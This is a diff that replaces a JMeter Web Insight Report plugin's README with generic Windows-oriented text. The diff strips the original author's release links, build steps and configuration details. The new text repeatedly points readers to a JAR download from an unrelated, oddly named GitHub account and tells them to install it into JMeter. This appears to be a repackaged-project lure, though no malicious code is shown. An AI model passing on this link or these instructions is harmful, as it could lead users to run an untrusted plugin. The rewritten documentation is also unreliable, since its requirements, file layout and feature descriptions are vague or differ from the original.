@@ -1,149 +1,200 @@
-# JMeter Web Insight Report
+# 📊 JmeterWebInsightReport - Clear HTML Reports for JMeter
 
-![License](https://img.shields.io/badge/license-Apache%202.0-blue)
-![Java](https://img.shields.io/badge/java-11%2B-orange)
-![Release](https://img.shields.io/github/v/release/aharon890/JmeterWebInsightReport)
-![Build](https://img.shields.io/github/actions/workflow/status/aharon890/JmeterWebInsightReport/ci.yml?branch=main&label=build)
+[![Download JmeterWebInsightReport](https://img.shields.io/badge/Download-JmeterWebInsightReport-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport)
 
-A JMeter plugin that generates modern, interactive web reports from your load test results — a powerful alternative to JMeter's built-in dashboard.
+## 🧭 What this does
 
-## Modules
+JmeterWebInsightReport is a JMeter listener plugin that turns test results into an interactive HTML report. It helps you view load test data in a clean browser page with charts, SLA checks, and baseline comparison.
 
-| Module | Description |
-|--------|-------------|
-| `jmeter-report-core` | Shared models, statistics engine, SLA evaluation |
-| `jmeter-web-insight-report` | Web Insight Report generator plugin |
+Use it when you want to:
 
-## Installation
+- view JMeter results in a browser
+- compare a test run with a baseline
+- check SLA targets
+- keep reports in one HTML file
+- share test results without extra tools
 
-### Option 1: Download (recommended)
+## 💻 Before you start
 
-Download the latest JAR from the [Releases page](https://github.com/aharon890/JmeterWebInsightReport/releases) and copy it to your JMeter `lib/ext/` directory.
+Use a Windows PC with:
 
-### Option 2: Build from source
+- Windows 10 or Windows 11
+- JMeter installed
+- Java installed
+- a web browser such as Edge, Chrome, or Firefox
+- enough disk space for test result files
 
-```bash
-mvn clean package -DskipTests
-cp jmeter-web-insight-report/target/jmeter-web-insight-report-1.0.0.jar $JMETER_HOME/lib/ext/
-```
+For best results, use:
 
-## Report Output Configuration
+- JMeter 5.4 or later
+- Java 8 or later
+- a test plan that already writes results to a listener or report file
 
-### GUI
+## 📥 Download and open the project
 
-The **Web Insight Report** listener has three configurable fields:
+Visit this page to download and get the plugin files:
 
-| Field | Description | Default |
-|-------|-------------|---------|
-| Report Title | Title shown in the report header | `JMeter Web Insight Report` |
-| Report Filename | Output filename | `web-insight-report.html` |
-| Output Directory | Where report files are written | Working directory |
+[https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport](https://github.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport)
 
-### CLI Properties
+If the page shows a release or packaged file, download it. If it shows source files, use the project files that match your JMeter setup.
 
-All settings can be controlled via JMeter properties (`-J` flags):
+After the download:
 
-```bash
-jmeter -n -t test.jmx \
-  -Jwebinsight.report.title="Checkout Load Test" \
-  -Jwebinsight.report.filename=report_${timestamp}.html \
-  -Jwebinsight.report.output=/results/reports
-```
+1. Save the file to a folder you can find later, such as `Downloads` or `Desktop`
+2. If the file is a ZIP file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Look for the plugin JAR file or report files in the project folder
 
-| Property | Description | Default |
-|----------|-------------|---------|
-| `webinsight.report.title` | Report title | `JMeter Web Insight Report` |
-| `webinsight.report.filename` | Report filename (JSON filename derived automatically) | `web-insight-report.html` |
-| `webinsight.report.output` | Output directory path | Working directory |
+## 🛠️ Install in JMeter
 
-### Timestamp in Filename
+Follow these steps to add the plugin to JMeter on Windows:
 
-Use `${timestamp}` in the filename to auto-insert `yyyyMMdd_HHmm`:
+1. Close JMeter if it is open
+2. Find the JMeter install folder
+3. Open the `lib/ext` folder inside JMeter
+4. Copy the plugin JAR file into `lib/ext`
+5. Start JMeter again
 
-```bash
--Jwebinsight.report.filename=report_${timestamp}.html
-```
+If the project includes extra files for styles, templates, or assets, keep them with the plugin files in the same folder structure shown in the project.
 
-Produces: `report_20260321_1652.html` and `report_20260321_1652.json`
+## ▶️ Run a test report
 
-### Docker / CI Example
+After installation, use the plugin in your JMeter test plan:
 
-```bash
-jmeter -n -t /tests/load-test.jmx \
-  -l /results/results.jtl \
-  -Jwebinsight.report.output=/results \
-  -Jwebinsight.report.filename=report_${timestamp}.html
-```
+1. Open JMeter
+2. Load your test plan
+3. Add the report or listener from the plugin, if it appears in the menu
+4. Run the test
+5. Wait for the run to finish
+6. Open the generated HTML report in your browser
 
-## Annotations & SLA
+The report gives you a clear view of test results, including:
 
-Place a `report-annotations.json` file next to the JTL file (or in JMeter's `bin/` directory). It's auto-detected.
+- response times
+- throughput
+- error rate
+- percentile data
+- SLA status
+- baseline comparison
 
-```json
-{
-  "testNotes": "## Objective\nValidate checkout under 500 concurrent users.",
-  "slaThresholds": {
-    "default": { "p95": 1000, "errorRate": 5.0 },
-    "POST /api/checkout": { "p95": 2000, "errorRate": 3.0 }
-  },
-  "samplerNotes": {
-    "POST /api/checkout": "Includes 2s payment processing delay"
-  },
-  "timelineMarkers": [
-    { "timestamp": 1773702727000, "label": "DB Failover", "type": "warning", "description": "Primary DB switched to replica" }
-  ]
-}
-```
+## 📈 What you can see in the report
 
-- **SLA thresholds** — per-sampler or `default` fallback. Metrics: `p95`, `p99`, `errorRate`, `meanResponseTime`. Report shows PASS/WARN/FAIL badges and threshold lines on charts.
-- **Test notes** — Markdown rendered in the Notes tab and Summary tab.
-- **Sampler notes** — info icon with tooltip next to sampler names in the table.
-- **Timeline markers** — vertical dashed lines on all charts at annotated timestamps.
+The HTML report uses ECharts to show data in a simple visual layout. It helps you read test results without sorting through raw tables.
 
-### Baseline Comparison
+Common report sections include:
 
-Rename a previous run's `results.jtl` to `baseline.jtl` in the same directory. The plugin auto-detects it and adds a **Compare** tab with:
-- Current vs baseline response time overlay chart
-- Per-sampler diff table with regression detection (>10% p95 increase or >2% error rate increase)
+- summary cards
+- response time charts
+- success and failure counts
+- time series plots
+- SLA pass or fail checks
+- baseline vs current run views
 
-### CI/CD Integration
+This makes it easier to spot changes in performance after a code update, config change, or deployment.
 
-Every report generation produces `web-insight-report.json`:
+## 🧪 Example use cases
 
-```json
-{
-  "testName": "Checkout Flow Load Test",
-  "status": "PASS",
-  "totalSamples": 847293,
-  "errorRate": 0.12,
-  "samplers": [...],
-  "slaViolations": [...]
-}
-```
+Use this plugin for:
 
-Use this in Jenkins/GitLab/GitHub Actions for automated pass/fail decisions.
+- checking if a page or API stays within SLA
+- comparing a new build with a previous run
+- reviewing performance trends across test runs
+- sharing a report with team members who do not use JMeter
+- keeping test results in a file that opens in any browser
 
-### Output Files
+## 📁 Typical folder layout
 
-| File | Description |
-|------|-------------|
-| `web-insight-report.html` | Self-contained interactive Web Insight Report |
-| `web-insight-report.json` | Machine-readable CI/CD summary |
-| `web-insight-report.xml` | JUnit XML (when enabled via `-Jwebinsight.report.junit=true`) |
-| `web-insight-data.json` | External chart data (only for large tests >10MB) |
+A common setup may look like this:
 
-## Documentation
+- `JMeter/`
+  - `lib/`
+    - `ext/`
+      - `JmeterWebInsightReport.jar`
+- `reports/`
+  - `run-001.html`
+  - `assets/`
+- `test-plans/`
+  - `login-test.jmx`
 
-See the [full documentation](https://aharon890.github.io/JmeterWebInsightReport/) with screenshots covering every tab, feature, and control.
+If the project uses a different layout, follow the folder names in the repository files.
 
-See [FEATURES.md](docs/FEATURES.md) for the feature list.
+## 🔍 How baseline comparison works
 
-## Requirements
+Baseline comparison lets you compare one run against a known reference run.
 
-- Java 11+
-- Apache JMeter 5.6.3+
-- Maven 3.8+
+A typical flow is:
 
-## License
+1. Run a test and save the result as the baseline
+2. Run the same test later
+3. Open the new report
+4. View the changes in latency, error rate, or throughput
+5. Check if the new run stays within your target range
 
-Apache License 2.0 — see [LICENSE](LICENSE).
+This helps you see if system changes affect performance.
+
+## ✅ SLA validation
+
+SLA validation checks if your test results meet your target values.
+
+You can use it to track:
+
+- average response time
+- maximum response time
+- error percentage
+- response time percentiles
+- success rate
+
+If a metric crosses the limit, the report flags it so you can spot the issue fast.
+
+## 🖱️ How to open the report in Windows
+
+Once the HTML report is generated:
+
+1. Open File Explorer
+2. Go to the folder with the report
+3. Find the `.html` file
+4. Double-click it
+5. The report opens in your browser
+
+If the file does not open, right-click it and choose Open with, then select your browser.
+
+## 🧩 Common setup checks
+
+If the plugin does not appear in JMeter, check these items:
+
+- the JAR file is in `lib/ext`
+- JMeter was restarted after copying the file
+- Java is installed
+- you copied the correct file for the plugin
+- the report files stayed together in the same folder
+
+If the report opens with missing charts or styles, make sure the assets folder is next to the HTML file.
+
+## 📝 File names you may see
+
+The project may include files with names like:
+
+- `*.jar` for the plugin
+- `*.html` for the report
+- `*.js` for chart logic
+- `*.css` for page styling
+- `*.json` for report data
+- `*.jmx` for JMeter test plans
+
+## 🔗 Project details
+
+- Repository: JmeterWebInsightReport
+- Type: JMeter listener plugin
+- Output: self-contained HTML report
+- Charts: ECharts
+- Focus: load testing, performance testing, SLA checks, baseline comparison
+
+## 🧭 Quick setup path
+
+1. Visit the download page
+2. Download the project files
+3. Extract the files if needed
+4. Copy the plugin JAR into JMeter `lib/ext`
+5. Restart JMeter
+6. Run a test plan
+7. Open the generated HTML report in your browser
